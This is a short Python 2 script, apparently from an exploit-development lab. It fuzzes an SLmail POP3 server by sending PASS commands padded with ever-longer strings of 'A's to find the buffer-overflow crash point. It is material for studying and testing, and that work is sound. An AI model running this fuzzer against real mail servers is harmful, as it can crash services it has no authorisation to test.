# script to identify buffer owerflow

#!/usr/bin/python
import time, struct, sys
import socket as so

buff=["A"]		# an array of buffer with 'A's

max_buffer = 4000	# Maximum size of buffer.

counter = 100		# Initial counter value (Starts at 100)

increment = 200		# increment in each attempt.

while len(buff) <= max_buffer:
    buff.append("A"*counter)
    counter=counter+increment

for string in buff:
     try:
        server = str(sys.argv[1])	# Target IP Address	
        port = int(sys.argv[2])		# Target Port
     except IndexError:
        print "[+] Usage example: python %s 192.168.220.134 110" % sys.argv[0]
        sys.exit()   
     print "[+] Attempting to crash SLmail at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)
     try:
        s.connect((server,port))
        s.recv(1024)
        s.send('USER Hsaba\r\n')
        s.recv(1023)
        s.send('PASS ' + string + '\r\n')
        s.send('QUIT\r\n')
        s.close()
     except: 
        print "[+] Connection failed. Make sure IP/port are correct, or check debugger for SLmail crash."
        sys.exit()
